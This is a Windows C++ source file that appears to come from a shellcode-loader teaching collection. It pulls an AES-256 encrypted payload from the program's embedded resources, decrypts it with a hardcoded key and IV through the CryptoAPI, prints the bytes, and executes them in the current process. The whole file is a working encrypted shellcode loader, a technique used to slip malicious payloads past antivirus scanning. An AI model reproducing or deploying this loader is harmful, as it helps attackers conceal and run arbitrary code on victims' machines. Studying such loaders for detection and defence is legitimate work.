#include <windows.h>
#include <stdio.h>
#include "..\utils\utility.h"
#include "..\utils\resources.h"

BYTE key[] = {0x23,0x73,0x68,0x65,0x6c,0x6c,0x63,0x6f,0x64,0x65,0x66,0x61,0x63,0x69,0x6c,0x65,0x23,0x73,0x68,0x65,0x6c,0x6c,0x63,0x6f,0x64,0x65,0x66,0x61,0x63,0x69,0x6c,0x65};
BYTE initializationVector[] = {0x97,0xb0,0x94,0xf9,0x72,0xa0,0xf2,0x23,0x9b,0xef,0xbc,0xeb,0xe7,0xe7,0x3b,0x4a};

// g++ -m64 -o aesCurrentProcessRsc.exe aesCurrentProcessRsc.cpp ../utils/utility.cpp ../utils/resources.o -ladvapi32
int main(int argc, char const *argv[])
{
    LPVOID              resAddr;
    PUCHAR              decrypted;
    DWORD               decryptedSize;      
    HCRYPTPROV          cspHandle;
    HCRYPTKEY           keyHandle; 
    
    // Load resource that contains encryoted data
    getResourceAddr(&resAddr, &decryptedSize, RSC_AES);
    MESSAGE(OKAY, "Resource loaded\n");

    // Get key for decryption
    getAesImportedKey(CALG_AES_256, (const BYTE*)CRYPT_MODE_CBC, (LPVOID)key, sizeof(key), initializationVector, &keyHandle, &cspHandle);

    // Allocate space for decrypted data
    allocateAndCopy((LPVOID *)&decrypted, resAddr, decryptedSize);
    MESSAGE(OKAY, "Data to be decrypted at : 0x%p\n", decrypted);

    // Decrypt padded data
    MESSAGE(INFO, "Press <enter> to decrypt...");
    getchar();
    if(!CryptDecrypt(keyHandle, 0, TRUE, 0, decrypted, &decryptedSize)){
        MESSAGE(FAIL, "Impossible to Decrypt the data\n");
        PRINT_ERROR(CryptDecrypt);
        return EXIT_FAILURE;
    }

    // print decryipted data
    MESSAGE(OKAY, "Decrypted data : [%ld bytes]\n", decryptedSize);
    for(int i = 0; i < decryptedSize; i++ ){
        printf("\\x%2x", decrypted[i]);
    }
    puts("");

    // Execute the code from decrypted data
    allowAndExecute((LPVOID)decrypted, decryptedSize);

    // Release resources
    CryptDestroyKey(keyHandle);
    CryptReleaseContext(cspHandle, 0);
    free(decrypted);

    return EXIT_SUCCESS;
}
